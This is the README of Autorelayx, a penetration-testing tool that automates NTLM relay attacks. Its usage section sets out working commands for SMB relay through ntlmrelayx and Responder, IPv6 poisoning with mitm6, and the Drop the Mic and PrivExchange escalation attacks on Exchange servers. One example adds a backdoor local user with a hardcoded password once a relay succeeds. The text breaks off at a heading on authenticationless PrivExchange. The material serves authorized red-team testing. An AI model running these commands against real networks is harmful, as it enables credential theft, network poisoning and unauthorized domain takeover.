Autorelayx
=======

Automates the process of setting up advanced relaying techniques.

# Installation

    sudo apt-get install tcpdump (required only for mitm6 domain filtering)
    git clone --recurse-submodules https://github.com/Coalfire-Research/autorelayx
    cd autorelayx
    sudo pipenv install
    sudo pipenv shell

# Usage

## SMB relay
Hostlist should be formatted in CIDR notation (192.168.0.0/24) or individual IPs separated by a newline. This will
scan the hosts in the hostlist for any that do not have SMB signing enabled and write them to unsigned-smb-hosts.txt.
Runs ntlmrelayx.py and Responder.

```python autorelayx.py -l hostlist.txt```

## IPv6 poisoning
This will run ntlmrelayx, Responder, and mitm6. It is suggested to use the -d <domain> argument to limit mitm6's responses.

```python autorelayx.py -l hostlist.txt -6 -d CONTOSO```

## Relaying to specified targets file and running a custom command once successful
```python autorelayx.py -tf targets_file.txt -c "net user /add danmcinerney P@ssword123456"```

## Drop the Mic and PrivExchange attacks
Script will test the exchange servers in exchange_servers.txt for vulnerability to SpoolService RPC abuse for the Drop the Mic attack. Should none of the servers be vulnerable, the script will move on to attempt the authenticated PrivExchange attack.
```python autorelayx.py -dc 1.2.3.4 -u LAB/dan:P@ssw0rd@exchangeServer.lab.local -ef exchange_servers.txt```

## Authenticationless PrivExchange
